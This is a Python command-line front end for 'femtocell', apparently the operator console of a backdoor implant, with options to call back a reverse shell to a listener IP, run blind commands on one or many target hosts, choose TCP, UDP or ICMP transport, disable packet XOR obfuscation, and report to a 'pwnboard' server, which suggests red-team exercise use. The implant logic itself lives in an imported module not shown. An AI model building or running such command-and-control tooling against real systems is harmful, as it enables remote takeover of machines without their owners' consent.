import femtocell
import argparse
import sys
import os
from termcolor import colored

def handle_args_main(ags):
    print(colored("FEMTOCELL // NON-INTERACTIVE\n", "green"))
    if ags.debug:
        femtocell.baseparams["XOR"] = False
    
    if ags.pwnboard is not None:
        femtocell.baseparams["PWNBOARD"] = ags.pwnboard

    femtocell.baseparams["MODE"] = ags.mode.upper()

    if ags.mode.upper() == "SHELL":
        femtocell.shellparams["RHOST"] = ags.target
        femtocell.shellparams["RPORT"] = ags.port
        femtocell.shellparams["TRANSPORT"] = ags.transport.upper()
        femtocell.shellparams["LHOST"] = ags.listen

        femtocell.executeShell(ags.send)
    elif ags.mode.upper() == "CMD":
        femtocell.cmdparams["RHOST"] = ags.target
        femtocell.cmdparams["RPORT"] = ags.port
        femtocell.cmdparams["TRANSPORT"] = ags.transport.upper()

        if ags.ping is not None:
            femtocell.interface = ags.ping

            femtocell.executePing()
        else:
            if ags.command is not None:
                femtocell.cmdparams["COMMAND"] = ' '.join(ags.command)

                femtocell.executeCmd()

    elif ags.mode.upper() == "GROUP":
        femtocell.groupparams["RHOST"] = ags.target
        femtocell.groupparams["RPORT"] = ags.port
        femtocell.groupparams["TRANSPORT"] = ags.transport.upper() 
        femtocell.groupparams["GROUP"] = ags.group

        if ags.file is not None and os.path.exists(ags.file):
            femtocell.importConfig(ags.file)
        else:
            print(colored(f"[-] File {ags.file} doesn't exist.\n", "red"))
            return

        if ags.ping is not None:
            femtocell.interface = ags.ping
            
            femtocell.executePing()
        else:
            if ags.command is not None:
                femtocell.groupparams["COMMAND"] = ' '.join(ags.command)

                femtocell.executeGroup()
    else:
        print( colored( f"[-] MODE {ags.mode} does not exist.\n", "red",))
    return

def setup_args():
    parser = argparse.ArgumentParser( description="Interact with a femtocell agent via CLI arguments or interactively. Run with no arguments to start interactive prompt.")
    parser.add_argument(
        "-m",
        "--mode",
        type=str,
        nargs="?",
        const=1,
        default="shell",
        help="Set the targeting mode. Options: <shell>/<cmd>/<group>. Default: Shell",
    )
    parser.add_argument(
        "-t",
        "--target",
        type=str,
        nargs="?",
        const=1,
        help="Target machine running the femtocell agent. Required if using <shell>/<cmd> mode.",
    )
    parser.add_argument(
        "-l",
        "--listen",
        type=str,
        nargs="?",
        const=1,
        help="IP that is listening for a callback shell. This IP must be reachable from the target machine. Required if using <shell> mode.",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        nargs="?",
        const=1,
        help="Port open on target. Default: 445.",
        default=445,
    )
    parser.add_argument(
        "-c",
        "--command",
        type=str,
        nargs="+",
        help="Run a single command. No output given. Required if using <cmd>/<group> mode.",
    )
    parser.add_argument(
        "-r",
        "--transport",
        type=str,
        nargs="?",
        const=1,
        help="Transport protocol to use. Options: <tcp>/<udp>/<icmp>. Default: TCP.",
        default="TCP",
    )
    parser.add_argument(
        "-f",
        "--file",
        type=str,
        nargs="?",
        const=1,
        help="Configuration file to load. Required if using <group> mode.",
    )
    parser.add_argument(
        "-g",
        "--group",
        type=str,
        nargs="?",
        const=1,
        help="Set of targets specified in configuration file. Required if using <group> mode.",
    )
    parser.add_argument(
        "--ping",
        type=str,
        nargs="?",
        const=1,
        help="Ethernet interface to listen on for ping callbacks. Only relevant to <cmd>/<group> mode.",
    )
    parser.add_argument(
        "--pwnboard",
        type=str,
        nargs="?",
        const=1,
        help="Link for pwnboard callback support.",
    )
    parser.add_argument("--send", dest="send", action="store_true", help="Send the shell to listener IP. Do not start listener on this machine.")
    parser.set_defaults(send=False)
    parser.add_argument("--debug", dest="debug", action="store_true", help="Debug mode. Disables initial packet encryption. For testing only.")
    parser.set_defaults(debug=False)
    ags = parser.parse_args()
    if len(sys.argv) >= 3: 
        handle_args_main(ags)
        exit()